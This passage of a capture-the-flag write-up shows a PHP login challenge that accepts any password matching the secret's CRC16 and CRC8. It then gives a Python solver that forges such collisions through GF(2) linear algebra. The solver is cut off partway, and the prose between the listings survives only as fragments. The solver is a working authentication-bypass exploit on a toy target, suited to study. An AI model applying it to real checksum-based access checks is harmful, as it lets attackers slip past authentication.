class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">        <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">        <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>,</span><br><span class="line">        <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">        <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>,</span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">        <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>,</span><br><span class="line">        <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">        <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>,</span><br><span class="line">        <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>,</span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>,</span><br><span class="line">        <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>,</span><br><span class="line">        <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">        <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>,</span><br><span class="line">        <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">        <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>,</span><br><span class="line">        <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">        <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$bytes</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C*&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$bytes</span>);</span><br><span class="line">    <span class="variable">$crc</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">1</span>; <span class="variable">$k</span> &lt;= <span class="variable">$length</span>; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$crc</span> = <span class="variable">$crc8_table</span>[(<span class="variable">$crc</span> ^ <span class="variable">$bytes</span>[<span class="variable">$k</span>]) &amp; <span class="number">0xff</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$crc</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$SECRET_PASS</span> = <span class="string">&quot;Enj0yNSSCTF4th!&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$SECRET_PASS</span>) == <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$correct_pass_crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line">    <span class="variable">$correct_pass_crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user_input</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_pass_crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$user_input</span>);</span><br><span class="line">    <span class="variable">$user_pass_crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$user_input</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$SECRET_PASS</span> === <span class="variable">$user_input</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$correct_pass_crc16</span> !== <span class="variable">$user_pass_crc16</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$correct_pass_crc8</span> !== <span class="variable">$user_pass_crc8</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$granted_access</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$granted_access</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;,flag: <span class="subst">$FLAG</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>15</code><code>crc8</code><code>crc16</code><code>crc</code><code>GPT</code><strong></strong></p><blockquote><p>CRC CRC16/CRC8324CRCGF(2)<br />GF(2)secretCRC16+CRC8</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">crc_collision.py</span></span><br><span class="line"><span class="string">Find a different message (same length) that is NOT equal to the secret but has identical CRC16 and CRC8.</span></span><br><span class="line"><span class="string">Method:</span></span><br><span class="line"><span class="string"> - Choose k byte positions to allow flipping (default k=3 -&gt; 24 binary variables).</span></span><br><span class="line"><span class="string"> - For a given base message, precompute the 24-bit effect (&quot;columns&quot;) of flipping each single bit</span></span><br><span class="line"><span class="string">   in those positions. The combined CRC (CRC16&lt;&lt;8 | CRC8) is a 24-bit linear function over GF(2).</span></span><br><span class="line"><span class="string"> - Build a GF(2) basis from the columns, then try to represent the difference between base_crc24 and</span></span><br><span class="line"><span class="string">   target_crc24 as an XOR of columns. If representable, we get which bits to flip -&gt; candidate message.</span></span><br><span class="line"><span class="string"> - Repeat for random base messages or different position sets until a valid candidate is found.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- CRC implementations matching the PHP code ----</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc16</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    checksum = <span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        checksum ^= b</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> checksum &amp; <span class="number">1</span>:</span><br><span class="line">                checksum = ((checksum &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                checksum &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> checksum &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">crc8_table = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>, <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>, <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>, <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>, <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>, <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">    <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>, <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>, <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>, <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>, <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc8</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    crc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        crc = crc8_table[(crc ^ b) &amp; <span class="number">0xff</span>]</span><br><span class="line">    <span class="keyword">return</span> crc &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc24</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (compute_crc16(data) &lt;&lt; <span class="number">8</span>) | compute_crc8(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- GF(2) basis solver to express target diff as XOR of columns ----</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_columns_for_positions</span>(<span class="params">base: <span class="built_in">bytes</span>, positions: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    For each (position, bit) produce a 24-bit column representing effect on crc24 when toggling that bit.</span></span><br><span class="line"><span class="string">    The order is for each position in positions (in order) and for bit 0..7 within each position.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    columns = []</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> positions:</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            b = <span class="built_in">bytearray</span>(base)</span><br><span class="line">            b[pos] ^= (<span class="number">1</span> &lt;&lt; bit)</span><br><span class="line">            eff = crc24(<span class="built_in">bytes</span>(b)) ^ crc24(base)</span><br><span class="line">            columns.append(eff)</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_solve_with_columns</span>(<span class="params">columns: <span class="type">List</span>[<span class="built_in">int</span>], target_diff: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given columns (list of 24-bit ints) and target_diff (24-bit int),</span></span><br><span class="line"><span class="string">    try to represent target_diff as XOR of some columns.</span></span><br><span class="line"><span class="string">    If possible, return an integer mask where bit j means use columns[j].</span></span><br><span class="line"><span class="string">    Otherwise return None.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># basis indexed by bit position 0..23 (we&#x27;ll store highest-bit-first reduction)</span></span><br><span class="line">    BASIS_BITS = <span class="number">24</span></span><br><span class="line">    basis = [<span class="number">0</span>] * BASIS_BITS      <span class="comment"># basis vector value for that leading bit</span></span><br><span class="line">    <span class="comment"># representation mask (which columns XOR to produce basis vector)</span></span><br><span class="line">    basis_repr = [<span class="number">0</span>] * BASIS_BITS</span><br><span class="line">    <span class="keyword">for</span> j, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(columns):</span><br><span class="line">        v = col</span><br><span class="line">        repr_mask = <span class="number">1</span> &lt;&lt; j</span><br><span class="line">        <span class="comment"># reduce using current basis</span></span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(BASIS_BITS)):</span><br><span class="line">            <span class="keyword">if</span> (v &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> basis[bit] != <span class="number">0</span>:</span><br><span class="line">                    v ^= basis[bit]</span><br><span class="line">                    repr_mask ^= basis_repr[bit]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    basis[bit] = v</span><br><span class="line">                    basis_repr[bit] = repr_mask</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># now try to reduce target_diff</span></span><br><span class="line">    v = target_diff</span><br><span class="line">    <span class="built_in">repr</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(BASIS_BITS)):</span><br><span class="line">        <span class="keyword">if</span> (v &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> basis[bit] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># cannot represent</span></span><br><span class="line">            v ^= basis[bit]</span><br><span class="line">            <span class="built_in">repr</span> ^= basis_repr[bit]</span><br><span class="line">    <span class="keyword">if</span> v == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">repr</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_candidate_from_mask</span>(<span class="params">base: <span class="built_in">bytes</span>, positions: <span class="type">List</span>[<span class="built_in">int</span>], mask: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    L = <span class="built_in">len</span>(base)</span><br><span class="line">    delta = <span class="built_in">bytearray</span>(L)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(positions) * <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (mask &gt;&gt; j) &amp; <span class="number">1</span>:</span><br><span class="line">            pos_idx = j // <span class="number">8</span></span><br><span class="line">            bit_idx = j % <span class="number">8</span></span><br><span class="line">            pos = positions[pos_idx]</span><br><span class="line">            delta[pos] ^= (<span class="number">1</span> &lt;&lt; bit_idx)</span><br><span class="line">    candidate = <span class="built_in">bytearray</span>(base)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">        candidate[i] ^= delta[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(candidate)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- High-level search routine ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">secret: <span class="built_in">bytes</span>, k: <span class="built_in">int</span> = <span class="number">3</span>, tries_per_positions_set: <span class="built_in">int</span> = <span class="number">1000</span>, seed: <span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>, position_sets: <span class="type">Optional</span>[<span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]] = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    secret: bytes (the true password)</span></span><br><span class="line"><span class="string">    k: number of bytes that may be toggled (choose positions set size k)</span></span><br><span class="line"><span class="string">    tries_per_positions_set: for each chosen set of positions, try this many random base messages</span></span><br><span class="line"><span class="string">    position_sets: optional explicit list of position lists to try; otherwise we try a few heuristics + random sets</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    random.seed(seed)</span><br><span class="line">    L = <span class="built_in">len</span>(secret)</span><br><span class="line">    target_crc24 = crc24(secret)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># produce default position sets if not provided</span></span><br><span class="line">    <span class="keyword">if</span> position_sets <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        pos_sets = []</span><br><span class="line">        <span class="comment"># try last k bytes, first k bytes, a middle mix</span></span><br><span class="line">        <span class="keyword">if</span> L &gt;= k:</span><br><span class="line">            pos_sets.append(<span class="built_in">list</span>(<span class="built_in">range</span>(L-k, L)))</span><br><span class="line">            pos_sets.append(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>, k)))</span><br><span class="line">            pos_sets.append(<span class="built_in">sorted</span>(random.sample(<span class="built_in">range</span>(L), k)))</span><br><span class="line">        <span class="comment"># add several random sets</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            pos_sets.append(<span class="built_in">sorted</span>(random.sample(<span class="built_in">range</span>(L), k)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pos_sets = position_sets</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> positions <span class="keyword">in</span> pos_sets:</span><br><span class="line">        <span class="comment"># prepare columns template for a base; columns depend on base, so must recompute per base</span></span><br><span class="line">        <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(tries_per_positions_set):</span><br><span class="line">            <span class="comment"># pick a random base that is *not* the secret (we can also use the secret itself but that often gives trivial zero-diff)</span></span><br><span class="line">            base = <span class="built_in">bytearray</span>(secret)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">                base[i] = random.randrange(<span class="number">256</span>)</span><br><span class="line">            base = <span class="built_in">bytes</span>(base)</span><br><span class="line">            columns = build_columns_for_positions(base, positions)</span><br><span class="line">            d = crc24(base) ^ target_crc24</span><br><span class="line">            mask = try_solve_with_columns(columns, d)</span><br><span class="line">            <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                candidate = build_candidate_from_mask(base, positions, mask)</span><br><span class="line">                <span class="keyword">if</span> candidate != secret <span class="keyword">and</span> crc24(candidate) == target_crc24:</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="string">&quot;secret&quot;</span>: secret,</span><br><span class="line">                        <span class="string">&quot;candidate&quot;</span>: candidate,</span><br><span class="line">                        <span class="string">&quot;positions&quot;</span>: positions,</span><br><span class="line">                        <span class="string">&quot;base&quot;</span>: base,</span><br><span class="line">                        <span class="string">&quot;mask&quot;</span>: mask</span><br><span class="line">                    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Helper to pretty-print bytes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 